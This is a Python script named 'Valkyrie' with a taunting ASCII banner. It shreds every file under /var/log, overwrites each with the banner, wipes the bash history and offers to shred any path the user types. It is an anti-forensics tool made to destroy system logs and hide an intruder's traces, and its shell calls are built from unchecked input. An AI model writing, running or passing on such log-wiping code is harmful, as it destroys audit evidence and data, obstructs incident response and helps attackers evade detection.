import os
from fnmatch import fnmatch

Banner="""

               |))    |))
 .             |  )) /   ))
 \\   ^ ^      |    /      ))
  \\(((  )))   |   /        ))
   / G    )))  |  /        ))
  |o  _)   ))) | /       )))
   --' |     ))`/      )))
    ___|              )))
   / __\             ))))`()))
  /\@   /             `(())))
  \/   /  /`_______/\   \  ))))
       | |          \ \  |  )))
       | |           | | |   )))
       |_@           |_|_@    ))
      /_/           /_/_/
Valkyrie
	Nothing to see here, go ahead.


"""
pattern = "*.*"



for path, subdirs, files in os.walk("/var/log"):

	for name in files:

		if fnmatch(name, pattern):
			print("File: " + name + " gets shred.\n")
			os.system("shred --force --exact -z {}".format(os.path.join(path, name)))
			f = open(os.path.join(path, name), 'w+')
			f.write(Banner)
			f.close()




valid = False
while valid == False:

	i = str(input("Do you wanna leave now? [Y]es, [N]o: "))


	if i == "Y":
		valid = True
		os.system("clear")
		os.system('>.bash_history')
		print(Banner)
		import sys
		sys.exit(0)

	elif i == "N":
		print("What do you want here?")
		print("Oh you want to cleare a custom file?")
		i = input("Give me the path to the custom file: ")
		if str(i) != "":
			os.system("shred --force --exact -z {}".format(str(i)))
			try:
				f = open(str(i), "w+")
				f.write(Banner)
				f.close()
				
				print("File: {} got shred sucsefully".format(i))
				
			except:
				print("File does not exit")
				
				
			
		else:
			print("That was not a file")
			print("I think you should leave now")

			sys.exit(0)
			
			
		valid = False

	else:
		print("False Input try again")
		valid = False
